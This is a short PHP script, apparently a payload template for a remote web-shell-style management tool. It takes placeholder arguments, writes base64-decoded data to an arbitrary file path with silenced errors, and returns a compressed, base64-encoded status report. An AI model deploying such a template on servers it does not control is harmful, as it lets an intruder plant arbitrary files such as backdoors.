<?php

$start = microtime(true);

$arguments = [
    'level' => '"^level^"',
    'path' => '"^path^"',
    'mode' => '"^mode^"',
    'data' => '"^data^"',
    'method' => '"^method^"',
    'permissions' => "^permissions^"
];

$debug = [];
$status = false;



function mkfile()
{
    global $arguments, $start, $status, $debug;
    extract($arguments, EXTR_SKIP);

    
    $dirPath = dirname($path);
    if (!is_dir($dirPath))
    {
        if (!mkdir($dirPath, $permissions, true))
        {
            @array_push($debug, ['error' => 'Unable to create directory `'.$dirPath, '`']);
            return;
        }
    }


    if (!file_exists($path))
    {
        switch ($method)
        {
            case 'file_put_contents':
                $result = @file_put_contents($path, base64_decode($data));
                break;
            case 'fopen':
                $file = @fopen($path, $mode);
                if ($file !== false) {
                    $result = @fwrite($file, base64_decode($data));
                    @fclose($file);
                }
                break;
            default:
                @array_push($debug, ['error' => 'Unable to create `'.$path.'`']);
        }
    }
    else
    {
        @array_push($debug, ['warning' => 'Path `'.$path.'` already exists']);
    }
}


@mkfile();

$response = json_encode([
    'status' => (empty($debug)) ? true : false,
    'time' => microtime(true) - $start,
    'debug' => $debug,
    'operation' => [
        'action' => 'mkfile',
        'arguments' => $arguments
    ],
    'data' => []
], JSON_UNESCAPED_UNICODE);

echo str_replace('=', '', base64_encode(gzdeflate($response, $level)));
// echo $response;

?>